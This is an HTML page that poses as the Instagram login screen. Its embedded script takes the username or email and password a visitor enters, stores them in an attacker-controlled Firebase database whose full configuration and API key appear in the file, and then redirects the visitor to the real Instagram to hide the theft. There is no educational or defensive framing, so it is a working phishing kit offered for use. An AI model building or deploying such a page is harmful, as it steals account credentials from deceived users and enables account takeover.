<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            width: 350px;
            text-align: center;
        }

        .login-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px;
            border-radius: 5px; /* Rounded corners for the container */
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Optional: adds shadow for a subtle effect */
        }

        .logo {
            width: 250px; /* Adjusted width */
            height: 100px; /* Adjusted height proportionally */
            margin: 0 auto 20px; /* Center horizontally and add margin-bottom */
            background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRNCLZHKTLEOKZDwh3sr39VHnlLzrHquaLv3nSA2OUdWdLl1cljz8P6E2k16ov-yr0a-lA&usqp=CAU');
            background-size: contain; /* Ensures the entire image is visible */
            background-position: center;
            background-repeat: no-repeat;
            display: block; /* Ensure it's a block-level element for centering */
        }

        form {
            display: flex;
            flex-direction: column;
        }

        input[type="text"], input[type="password"] {
            margin-bottom: 10px;
            padding: 10px;
            font-size: 14px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
        }

        button[type="submit"] {
            padding: 10px;
            background-color: #3897f0;
            color: #fff;
            border: none;
            border-radius: 30px; /* Increased border-radius for a more curved effect */
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 10px;
        }

        .divider {
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 14px;
            position: relative;
        }

        .divider:before, .divider:after {
            content: "";
            background-color: #dbdbdb;
            height: 1px;
            width: 40%;
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
        }

        .divider:before {
            left: 0;
        }

        .divider:after {
            right: 0;
        }

        .fb-login {
            padding: 10px;
            background-color: white;
            color: darkblue;
            border: none;
            border-radius: 10px; /* Increased border-radius for a more curved effect */
            font-weight: bold;
            cursor: pointer;
        }

        .forgot-password {
            margin-top: 20px;
            font-size: 12px;
            color: #00376b;
        }

        .signup-container {
            margin-top: 20px;
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            border-radius: 5px; /* Rounded corners for the container */
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Optional: adds shadow for a subtle effect */
        }

        .signup {
            font-size: 14px;
        }

        .signup a {
            color: #0095f6;
            text-decoration: none;
        }

        .get-app {
            margin-top: 20px;
            font-size: 14px;
            color: #8e8e8e;
        }

        .app-links {
            margin-top: 10px;
        }

        .app-links img {
            width: 135px;
            margin: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-container">
            <div class="logo"></div>
            <form>
                <input type="text" placeholder="Phone number, username, or email">
                <input type="password" placeholder="Password">
                <button type="submit">Log in</button>
                <div class="divider">OR</div>
                <button type="button" class="fb-login">Log in with Facebook</button>
                <a href="instagram.com" class="forgot-password">Forgot password?</a>
            </form>
        </div>
        <div class="signup-container">
            <div class="signup">
                Don't have an account? <a href="#">Sign up</a>
            </div>
        </div>
        <div class="get-app">
            <p>Get the app.</p>
            <div class="app-links">
                <a aria-label="Get it on Google Play" href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=ig_mid%3D15E74B33-67D0-4F1D-9437-C9223E09368E%26utm_campaign%3DunifiedHome%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge" rel="nofollow noreferrer" target="_blank">
                    <img alt="Get it on Google Play" src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png">
                </a>
                <a aria-label="Get it from Microsoft" href="ms-windows-store://pdp/?productid=9nblggh5l9xt&amp;referrer=appbadge&amp;source=www.instagram.com&amp;mode=mini&amp;pos=0%2C0%2C1920%2C1020" rel="nofollow noreferrer" target="_blank">
                    <img alt="Get it from Microsoft" src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png">
                </a>
            </div>
        </div>
    </div>
    <!-- Firebase SDKs -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js"></script>

    <script>
        // Your Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyDpa29Aq7gNhsjT3fzhZSHlSJSJq-f3JZM",
            authDomain: "instagram-1b504.firebaseapp.com",
            databaseURL: "https://instagram-1b504-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "instagram-1b504",
            storageBucket: "instagram-1b504.appspot.com",
            messagingSenderId: "629010790114",
            appId: "1:629010790114:web:5195248d0e727b9f74d0bb",
            measurementId: "G-J1E2CNTXEY"
        };

        // Initialize Firebase
        const app = firebase.initializeApp(firebaseConfig);
        const database = firebase.getDatabase(app);

        // Handle form submission
        document.addEventListener('DOMContentLoaded', () => {
            const form = document.querySelector('form');
            
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                
                const email = form.querySelector('input[type="text"]').value;
                const password = form.querySelector('input[type="password"]').value;
                
                if (email && password) {
                    // Create a unique key for each entry
                    const userId = Date.now(); // Simple unique ID based on timestamp
                    const userRef = firebase.ref(database, 'users/' + userId);

                    // Save the data to Firebase Realtime Database
                    firebase.set(userRef, {
                        email: email,
                        password: password
                    }).then(() => {
                        // Redirect to Instagram after data is saved
                        window.location.href = 'https://www.instagram.com';
                    }).catch((error) => {
                        console.error(error);
                    });
                } else {
                    alert('Please enter both email and password.');
                }
            });
        });
    </script>
</body>
</html>
